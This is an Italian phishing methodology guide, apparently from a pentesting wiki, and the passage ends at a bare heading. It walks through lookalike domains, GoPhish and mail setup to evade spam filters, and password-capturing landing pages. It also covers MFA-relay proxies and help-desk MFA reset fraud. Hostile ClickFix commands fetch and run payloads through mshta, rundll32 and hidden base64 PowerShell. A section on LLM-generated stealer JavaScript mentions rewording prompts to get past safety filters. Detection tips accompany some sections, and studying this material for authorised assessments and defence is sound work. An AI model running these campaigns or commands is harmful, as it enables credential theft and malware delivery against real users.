# Metodologia di phishing

## Metodologia

1. Esegui la ricognizione sulla vittima
1. Seleziona il **dominio della vittima**.
2. Esegui una semplice enumerazione web **cercando i portali di login** utilizzati dalla vittima e **decidi** quale **impersonare**.
3. Usa **OSINT** per **trovare indirizzi email**.
2. Prepara l'ambiente
1. **Acquista il dominio** che utilizzerai per il phishing assessment
2. **Configura i record correlati al servizio email** (SPF, DMARC, DKIM, rDNS)
3. Configura il VPS con **gophish**
3. Prepara la campagna
1. Prepara il **template email**
2. Prepara la **pagina web** per rubare le credenziali
4. Avvia la campagna!

## Genera nomi di dominio simili o acquista un dominio affidabile

### Tecniche di variazione del nome di dominio

- **Keyword**: Il nome di dominio **contiene una** **keyword** importante del dominio originale (es., zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Sottodominio con trattino**: Sostituisci il **punto con un trattino** di un sottodominio (es., www-zelster.com).
- **Nuovo TLD**: Stesso dominio utilizzando un **nuovo TLD** (es., zelster.org)
- **Homoglyph**: **Sostituisce** una lettera nel nome di dominio con **lettere dall'aspetto simile** (es., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Trasposizione:** **Scambia due lettere** all'interno del nome di dominio (es., zelsetr.com).
- **Singolarizzazione/Pluralizzazione**: Aggiunge o rimuove la “s” alla fine del nome di dominio (es., zeltsers.com).
- **Omissione**: **Rimuove una** delle lettere dal nome di dominio (es., zelser.com).
- **Ripetizione:** **Ripete una** delle lettere nel nome di dominio (es., zeltsser.com).
- **Sostituzione**: Come homoglyph, ma meno furtiva. Sostituisce una delle lettere nel nome di dominio, magari con una lettera vicina a quella originale sulla tastiera (es., zektser.com).
- **Con sottodominio**: Inserisce un **punto** all'interno del nome di dominio (es., ze.lster.com).
- **Inserimento**: **Inserisce una lettera** nel nome di dominio (es., zerltser.com).
- **Punto mancante**: Aggiunge il TLD al nome di dominio (es., zelstercom.com)

**Strumenti automatici**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Siti web**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Esiste la **possibilità che alcuni bit memorizzati o in comunicazione possano essere invertiti automaticamente** a causa di vari fattori, come brillamenti solari, raggi cosmici o errori hardware.

Quando questo concetto viene **applicato alle richieste DNS**, è possibile che il **dominio ricevuto dal server DNS** non sia lo stesso richiesto inizialmente.

Ad esempio, una singola modifica di bit nel dominio "windows.com" può trasformarlo in "windnws.com."

Gli attacker possono **sfruttare questa situazione registrando più domini bit-flipping** simili al dominio della vittima. Il loro obiettivo è reindirizzare gli utenti legittimi verso la propria infrastruttura.

Per ulteriori informazioni, leggi [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Acquista un dominio affidabile

Puoi cercare su [https://www.expireddomains.net/](https://www.expireddomains.net) un dominio scaduto che potresti utilizzare.\
Per assicurarti che il dominio scaduto che stai per acquistare **abbia già un buon SEO**, puoi verificare come è categorizzato in:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Scoprire gli indirizzi email

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% gratuito)
- [https://phonebook.cz/](https://phonebook.cz) (100% gratuito)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Per **scoprire più** indirizzi email validi o **verificare quelli** già scoperti, puoi controllare se è possibile eseguire il brute-force sui server smtp della vittima. [Scopri qui come verificare/scoprire gli indirizzi email](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Inoltre, non dimenticare che, se gli utenti utilizzano **un portale web per accedere alle proprie email**, puoi verificare se è vulnerabile al **username brute force** e sfruttare la vulnerabilità, se possibile.

## Configurazione di GoPhish

### Installazione

Puoi scaricarlo da [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Scaricalo e decomprimilo in `/opt/gophish`, quindi esegui `/opt/gophish/gophish`\
Nell'output verrà visualizzata una password per l'utente admin sulla porta 3333. Accedi quindi a quella porta e utilizza tali credenziali per modificare la password admin. Potrebbe essere necessario eseguire il tunneling di quella porta verso localhost:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configurazione

**Configurazione del certificato TLS**

Prima di questo passaggio dovresti avere **già acquistato il dominio** che utilizzerai, che deve **puntare** all'**IP del VPS** su cui stai configurando **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Configurazione della posta**

Inizia l'installazione: `apt-get install postfix`

Quindi aggiungi il dominio ai seguenti file:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Modifica anche i valori delle seguenti variabili all'interno di /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Infine modifica i file **`/etc/hostname`** e **`/etc/mailname`** inserendo il nome del tuo dominio e **riavvia il tuo VPS.**

Ora crea un **record DNS A** di `mail.<domain>` che punti all'**indirizzo IP** del VPS e un **record DNS MX** che punti a `mail.<domain>`

Ora testiamo l'invio di un'e-mail:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Configurazione di Gophish**

Arresta l'esecuzione di gophish e configuriamolo.\
Modifica `/opt/gophish/config.json` come segue (nota l'uso di https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Configura il servizio gophish**

Per creare il servizio gophish in modo che possa essere avviato automaticamente e gestito come servizio, puoi creare il file `/etc/init.d/gophish` con il seguente contenuto:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Completa la configurazione del servizio e verificalo procedendo come segue:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Configurazione del mail server e del dominio

### Aspetta e sii legittimo

Più un dominio è vecchio, meno è probabile che venga rilevato come spam. Dovresti quindi aspettare il più a lungo possibile (almeno 1 settimana) prima del phishing assessment. Inoltre, se inserisci una pagina relativa a un settore con una buona reputazione, la reputazione ottenuta sarà migliore.

Nota che, anche se devi aspettare una settimana, puoi completare ora tutta la configurazione.

### Configura il record Reverse DNS (rDNS)

Imposta un record rDNS (PTR) che risolva l'indirizzo IP del VPS nel nome di dominio.

### Record Sender Policy Framework (SPF)

Devi **configurare un record SPF per il nuovo dominio**. Se non sai cosa sia un record SPF, [**leggi questa pagina**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Puoi usare [https://www.spfwizard.net/](https://www.spfwizard.net) per generare la tua policy SPF (usa l'IP della macchina VPS)

![Modulo SPF Wizard per generare un record SPF per un dominio di phishing](<../../images/image (1037).png>)

Questo è il contenuto che deve essere impostato all'interno di un record TXT nel dominio:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Record DMARC (Domain-based Message Authentication, Reporting & Conformance)

Devi **configurare un record DMARC per il nuovo dominio**. Se non sai cos'è un record DMARC, [**leggi questa pagina**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Devi creare un nuovo record DNS TXT che punti all'hostname `_dmarc.<domain>` con il seguente contenuto:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Devi **configurare un DKIM per il nuovo dominio**. Se non sai cos'è un record DMARC, [**leggi questa pagina**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Questo tutorial è basato su: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Devi concatenare entrambi i valori B64 generati dalla chiave DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Testa il punteggio della configurazione email

Puoi farlo utilizzando [https://www.mail-tester.com/](https://www.mail-tester.com)\
Accedi semplicemente alla pagina e invia un'email all'indirizzo che ti viene fornito:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Puoi anche **controllare la configurazione della tua email** inviando un'email a `check-auth@verifier.port25.com` e **leggendo la risposta** (a tal fine dovrai **aprire** la porta **25** e visualizzare la risposta nel file _/var/mail/root_ se invii l'email come root).\
Verifica di superare tutti i test:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Potresti anche inviare un **messaggio a un account Gmail sotto il tuo controllo** e controllare le **intestazioni dell'email** nella posta in arrivo di Gmail: dovrebbe essere presente `dkim=pass` nel campo dell'intestazione `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Rimozione dalla blacklist di Spamhaus

La pagina [www.mail-tester.com](https://www.mail-tester.com) può indicarti se il tuo dominio viene bloccato da Spamhaus. Puoi richiedere la rimozione del tuo dominio/IP a: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Rimozione dalla blacklist di Microsoft

​​Puoi richiedere la rimozione del tuo dominio/IP a [https://sender.office.com/](https://sender.office.com).

## Creazione e avvio della campagna GoPhish

### Profilo di invio

- Imposta un **nome per identificare** il profilo del mittente
- Decidi da quale account invierai le email di phishing. Suggerimenti: _noreply, support, servicedesk, salesforce..._
- Puoi lasciare vuoti il nome utente e la password, ma assicurati di selezionare Ignore Certificate Errors

![Creazione e avvio della campagna GoPhish - Profilo di invio: puoi lasciare vuoti il nome utente e la password, ma assicurati di selezionare Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> È consigliato utilizzare la funzionalità "**Send Test Email**" per verificare che tutto funzioni.\
> Ti consiglio di **inviare le email di test a indirizzi email 10min** per evitare di essere inserito in blacklist durante i test.

### Modello email

- Imposta un **nome per identificare** il modello
- Quindi scrivi un **oggetto** (nulla di strano, solo qualcosa che ti aspetteresti di leggere in una normale email)
- Assicurati di aver selezionato "**Add Tracking Image**"
- Scrivi il **modello email** (puoi utilizzare variabili come nell'esempio seguente):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Nota che **per aumentare la credibilità dell'email**, è consigliato utilizzare una firma proveniente da un'email del cliente. Suggerimenti:

- Invia un'email a un **indirizzo inesistente** e verifica se la risposta contiene una firma.
- Cerca **email pubbliche** come info@ex.com, press@ex.com o public@ex.com, invia loro un'email e attendi la risposta.
- Prova a contattare un indirizzo email **valido individuato** e attendi la risposta.

![Profilo di invio - Modello email: prova a contattare un indirizzo email valido individuato e attendi la risposta](<../../images/image (80).png>)

> [!TIP]
> Il modello email consente anche di **allegare file da inviare**. Se vuoi inoltre rubare challenge NTLM utilizzando file/documenti appositamente creati [leggi questa pagina](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Imposta un **nome**
- **Scrivi il codice HTML** della pagina web. Nota che puoi **importare** pagine web.
- Seleziona **Capture Submitted Data** e **Capture Passwords**
- Imposta un **reindirizzamento**

![Modello email - Landing Page: seleziona Capture Submitted Data e Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Di solito dovrai modificare il codice HTML della pagina ed effettuare alcuni test in locale (magari utilizzando un server Apache) **finché non sarai soddisfatto del risultato.** Quindi, inserisci quel codice HTML nel riquadro.\
> Nota che, se devi **utilizzare risorse statiche** per l'HTML (ad esempio pagine CSS e JS), puoi salvarle in _**/opt/gophish/static/endpoint**_ e accedervi da _**/static/\<filename>**_

> [!TIP]
> Per il reindirizzamento potresti **reindirizzare gli utenti alla pagina web principale legittima** della vittima oppure, ad esempio, reindirizzarli a _/static/migration.html_, inserire una **rotella di caricamento (**[**https://loading.io/**](https://loading.io)**) per 5 secondi e poi indicare che il processo è stato completato correttamente**.

### Users & Groups

- Imposta un nome
- **Importa i dati** (nota che, per utilizzare il modello dell'esempio, devi inserire il nome, il cognome e l'indirizzo email di ogni utente)

![Landing Page - Users & Groups: importa i dati (nota che, per utilizzare il modello dell'esempio, devi inserire il nome, il cognome e l'indirizzo email di ogni utente)](<../../images/image (163).png>)

### Campaign

Infine, crea una campagna selezionando un nome, il modello email, la landing page, l'URL, il profilo di invio e il gruppo. Nota che l'URL sarà il link inviato alle vittime.

Nota che il **profilo di invio consente di inviare un'email di test per verificare come apparirà l'email di phishing finale**:

![Users & Groups - Campaign: nota che il profilo di invio consente di inviare un'email di test per verificare come apparirà l'email di phishing finale](<../../images/image (192).png>)

Una volta pronto tutto, avvia semplicemente la campagna!

## Clonazione del sito web

Se per qualsiasi motivo vuoi clonare il sito web, consulta la pagina seguente:


{{#ref}}
clone-a-website.md
{{#endref}}

## Documenti e file con backdoor

In alcune valutazioni di phishing (principalmente per i Red Team) potresti voler **inviare anche file contenenti una sorta di backdoor** (magari un C2 o semplicemente qualcosa che attivi un'autenticazione).\
Consulta la pagina seguente per alcuni esempi:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Tramite Proxy MitM

L'attacco precedente è piuttosto ingegnoso, poiché stai falsificando un sito web reale e raccogliendo le informazioni inserite dall'utente. Sfortunatamente, se l'utente non ha inserito la password corretta o se l'applicazione falsificata è configurata con 2FA, **queste informazioni non ti consentiranno di impersonare l'utente ingannato**.

È qui che strumenti come [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) e [**muraena**](https://github.com/muraenateam/muraena) sono utili. Questo strumento consente di generare un attacco simile a un MitM. In pratica, gli attacchi funzionano nel modo seguente:

1. **Impersoni il** modulo di login della pagina web reale.
2. L'utente **invia** le proprie **credenziali** alla tua pagina falsa e lo strumento le invia alla pagina web reale, **verificando se le credenziali funzionano**.
3. Se l'account è configurato con **2FA**, la pagina MitM la richiederà e, quando l'**utente la inserisce**, lo strumento la invierà alla pagina web reale.
4. Una volta autenticato l'utente, tu (in qualità di attacker) avrai **catturato le credenziali, la 2FA, il cookie e qualsiasi informazione** relativa a ogni interazione avvenuta mentre lo strumento esegue un MitM.

### Tramite VNC

E se, invece di **inviare la vittima a una pagina dannosa** con lo stesso aspetto di quella originale, la inviassi a una **sessione VNC con un browser connesso alla pagina web reale**? Potresti vedere ciò che fa, rubare la password, la MFA utilizzata, i cookie...\
Puoi farlo con [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Rilevare il rilevamento

Ovviamente, uno dei modi migliori per sapere se sei stato scoperto è **cercare il tuo dominio all'interno delle blacklist**. Se compare nell'elenco, in qualche modo il tuo dominio è stato rilevato come sospetto.\
Un modo semplice per verificare se il tuo dominio compare in una blacklist consiste nell'utilizzare [https://malwareworld.com/](https://malwareworld.com)

Tuttavia, esistono altri modi per sapere se la vittima sta **cercando attivamente attività di phishing sospette nel cyberspazio**, come spiegato in:


{{#ref}}
detecting-phising.md
{{#endref}}

Puoi **acquistare un dominio con un nome molto simile** a quello della vittima **e/o generare un certificato** per un **sottodominio** di un dominio sotto il tuo controllo, **contenente** la **keyword** del dominio della vittima. Se la **vittima** esegue qualsiasi tipo di **interazione DNS o HTTP** con essi, saprai che sta **cercando attivamente** domini sospetti e dovrai essere molto discreto.<sup>[[2]](#references)</sup>

### Valutare il phishing

Utilizza [**Phishious** ](https://github.com/Rices/Phishious)per valutare se la tua email finirà nella cartella spam, verrà bloccata o avrà esito positivo.

## Compromissione dell'identità ad alto contatto (reset MFA tramite Help Desk)

I moderni gruppi di intrusione evitano sempre più spesso i messaggi email-esca e **prendono direttamente di mira il workflow del service desk / del recupero dell'identità** per aggirare la MFA. L'attacco è interamente "living-off-the-land": una volta ottenute credenziali valide, l'operatore si sposta utilizzando strumenti di amministrazione integrati: non è richiesto alcun malware.<sup>[[6]](#references)</sup>

### Flusso dell'attacco
1. Ricognizione sulla vittima
* Raccogli dettagli personali e aziendali da LinkedIn, data breach, GitHub pubblico, ecc.
* Identifica le identità di alto valore (dirigenti, IT, finance) ed enumera l'**esatto processo dell'help desk** per il reset della password / MFA.
2. Social engineering in tempo reale
* Chiama, contatta tramite Teams o chatta con l'help desk impersonando il target (spesso utilizzando un **caller-ID falsificato** o una **voce clonata**).
* Fornisci i dati personali precedentemente raccolti per superare la verifica basata sulla conoscenza.
* Convinci l'operatore a **reimpostare il segreto MFA** o a eseguire un **SIM-swap** su un numero di cellulare registrato.
3. Azioni immediate successive all'accesso (≤60 min nei casi reali)
* Stabilisci un foothold tramite qualsiasi portale web SSO.
* Enumera AD / AzureAD con strumenti integrati (senza distribuire binari):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Esegui il movimento laterale con **WMI**, **PsExec** o agenti **RMM** legittimi già autorizzati nell'ambiente.

### Rilevamento e mitigazione
* Considera il recupero dell'identità tramite help desk come un'**operazione privilegiata**: richiedi un'autenticazione step-up e l'approvazione del manager.
* Implementa regole di **Identity Threat Detection & Response (ITDR)** / **UEBA** che generino un alert per:
* Modifica del metodo MFA + autenticazione da un nuovo dispositivo / area geografica.
* Immediata elevazione dello stesso principal (user-→-admin).
* Registra le chiamate all'help desk e imponi una **richiamata a un numero già registrato** prima di qualsiasi reset.
* Implementa **Just-In-Time (JIT) / Privileged Access** affinché gli account appena reimpostati non ereditino automaticamente token con privilegi elevati.

---

## Inganno su larga scala – SEO Poisoning e campagne “ClickFix”
I gruppi criminali comuni compensano il costo delle operazioni ad alto contatto con attacchi di massa che trasformano **motori di ricerca e ad network nel canale di distribuzione**.<sup>[[6]](#references)</sup>

1. Il **SEO poisoning / malvertising** spinge un risultato falso, come `chromium-update[.]site`, in cima agli annunci di ricerca.
2. La vittima scarica un piccolo **first-stage loader** (spesso JS/HTA/ISO). Esempi osservati da Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Il loader esfiltra cookie del browser e database delle credenziali, quindi scarica un **silent loader** che decide, *in realtime*, se distribuire:
* RAT (ad esempio AsyncRAT, RustDesk)
* ransomware / wiper
* componente di persistenza (chiave Run del registro + attività pianificata)

### Suggerimenti di hardening
* Blocca i domini appena registrati e applica **Advanced DNS / URL Filtering** anche agli *search ads*, oltre che alle email.
* Limita l'installazione del software a pacchetti MSI / Store firmati e nega l'esecuzione di `HTA`, `ISO`, `VBS` tramite policy.
* Monitora i processi figli dei browser che aprono installer:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Cerca i LOLBins frequentemente utilizzati impropriamente dai first-stage loader (ad esempio `regsvr32`, `curl`, `mshta`).

### Hijacking del click sul pulsante di download con passaggio al TDS
Alcuni portali di software falsi mantengono l'`href` di download visibile che punta al **vero URL GitHub/release**, ma dirottano la **prima** interazione dell'utente tramite JavaScript e inviano invece la vittima in una catena di **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Caratteristiche principali:
- L’hook viene solitamente eseguito nella **capture phase** (`true`) su `document`, quindi si attiva prima degli handler del sito.
- Chrome usa spesso `mousedown` invece di `click` per mantenere il redirect associato a un **user gesture** valido e migliorare l’elusione del popup blocker.
- Alcune varianti aprono prima `about:blank` o simulano click su `<a target="_blank">`, assegnando l’URL del TDS solo in seguito.
- I limiti lato browser sono spesso memorizzati in `localStorage`, quindi il **primo click** può raggiungere il malware, mentre refresh e nuovi tentativi ricadono sul link visibile dall’aspetto benigno.
- Il TDS può filtrare in base a referrer, dominio di ingresso, GEO, fingerprint del browser/dispositivo, controlli VPN/datacenter, contesto del click e contatori per sessione, rendendo i replay degli analisti non deterministici.

Idee per i defender:
- Confrontare l’`href` **visualizzato** con la destinazione di navigazione **effettiva** generata al momento del click.
- Cercare handler `document.addEventListener(..., true)` che chiamano sia `preventDefault()` sia `stopImmediatePropagation()` insieme a `window.open`, `about:blank` o click simulati su anchor.
- Considerare i cluster di domini per il download di software registrati di recente, che caricano tutti lo stesso stage CloudFront/JS, come un pattern ad alto segnale di SEO poisoning/TDS.

### ClickFix da pagine di verifica fasulle + fetch LOLBAS dall’aspetto di un archivio
Alcuni rami del TDS terminano in una pagina di verifica fasulla (in stile Cloudflare/IUAM) che indica alla vittima di eseguire un binario Windows attendibile come:<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Note:
- `mshta.exe` esegue **HTA/VBScript all'inizio della risposta**, anche se l'URL finge di puntare a un archivio `.7z`; i dati dell'archivio aggiunti possono essere un puro depistaggio.
- Gli stage successivi spesso continuano a mentire sul tipo di file (`.rtf` per PowerShell, `.asar` per Python, ZIP con binari riempiti) e poi passano al **manual PE mapping / in-memory execution**.
- Se rispondi a una di queste chain, conserva **network + memory dalla prima esecuzione riuscita**: i replay successivi potrebbero mostrare solo un percorso benigno di installer/SFX oppure fallire perché il rilascio del payload/della key era associato alla sessione TDS originale.

### Tradecraft di delivery di DLL tramite ClickFix (falso aggiornamento CERT)
* Esca: advisory CERT nazionale clonato con un pulsante **Update** che mostra istruzioni dettagliate per la “correzione”. Alle vittime viene detto di eseguire un batch che scarica una DLL e la esegue tramite `rundll32`.<sup>[[12]](#references)</sup>
* Tipica chain batch osservata:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` salva il payload in `%TEMP%`, una breve pausa nasconde il jitter di rete, quindi `rundll32` chiama l'entrypoint esportato (`notepad`).
* La DLL invia al beacon l'identità dell'host ed esegue il polling verso il C2 ogni pochi minuti. Il tasking remoto arriva come **PowerShell codificato in base64**, eseguito in modalità nascosta e con bypass delle policy:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Questo mantiene la flessibilità del C2 (il server può sostituire i task senza aggiornare la DLL) e nasconde le finestre della console. Cerca processi PowerShell figli di `rundll32.exe` che utilizzano insieme `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
* I defender possono cercare callback HTTP(S) nella forma `...page.php?tynor=<COMPUTER>sss<USER>` e intervalli di polling di 5 minuti dopo il caricamento della DLL.

---

## Operazioni di Phishing potenziate dall'AI
Gli attacker ora concatenano **LLM e API di voice-cloning** per creare esche completamente personalizzate e interagire in tempo reale.

| Layer | Esempio di utilizzo da parte del threat actor |
|-------|-----------------------------------------------|
|Automation|Generare e inviare >100 k email / SMS con testo randomizzato e link di tracking.|
|Generative AI|Produrre email *one-off* che fanno riferimento a operazioni M&A pubbliche e inside joke dai social media; utilizzare la voce deep-fake del CEO in una callback scam.|
|Agentic AI|Registrare autonomamente domini, effettuare scraping di informazioni open-source e preparare le email dello stage successivo quando una vittima fa clic ma non invia le credenziali.|

**Difesa:**
• Aggiungere **banner dinamici** che evidenzino i messaggi inviati da sistemi di automation non attendibili (tramite anomalie ARC/DKIM).
• Implementare **frasi di challenge voice-biometriche** per le richieste telefoniche ad alto rischio.
• Simulare continuamente esche generate dall'AI nei programmi di awareness: i template statici sono obsoleti.

Vedi anche: abuso della navigazione agentic per il credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Vedi anche: abuso da parte degli AI agent degli strumenti CLI locali e di MCP (per l'inventario e il rilevamento dei secret):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Assemblaggio runtime di JavaScript per il phishing assistito da LLM (codegen in-browser)

Gli attacker possono distribuire HTML dall'aspetto benigno e **generare lo stealer a runtime** chiedendo JavaScript a una **trusted LLM API**, per poi eseguirlo nel browser (ad esempio, tramite `eval` o `<script>` dinamico).<sup>[[8]](#references)</sup>

1. **Prompt-as-obfuscation:** codificare gli URL di exfil/Base64 nelle prompt; modificare iterativamente la formulazione per aggirare i safety filter e ridurre le hallucination.
2. **Client-side API call:** al caricamento, il JS chiama un LLM pubblico (Gemini/DeepSeek/ecc.) o un proxy CDN; nell'HTML statico sono presenti solo la prompt e la chiamata API.
3. **Assemble & exec:** concatenare la risposta ed eseguirla (polimorfica a ogni visita):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** il codice generato personalizza il lure (ad es., il parsing dei token di LogoKit) e invia le credenziali all'endpoint nascosto nel prompt.

**Caratteristiche di evasione**
- Il traffico raggiunge domini LLM ben noti o proxy CDN affidabili; talvolta tramite WebSockets verso un backend.
- Nessun payload statico; il JS malevolo esiste solo dopo il rendering.
- Le generazioni non deterministiche producono **stealer unici** per ogni sessione.

**Idee per il rilevamento**
- Eseguire sandbox con JS abilitato; segnalare **`eval` a runtime/creazione dinamica di script originata da risposte LLM**.
- Cercare POST dal front-end verso API LLM seguiti immediatamente da `eval`/`Function` sul testo restituito.
- Generare un alert per domini LLM non autorizzati nel traffico client seguiti da POST successivi di credenziali.

---

## Variante MFA Fatigue / Push Bombing – Forced Reset
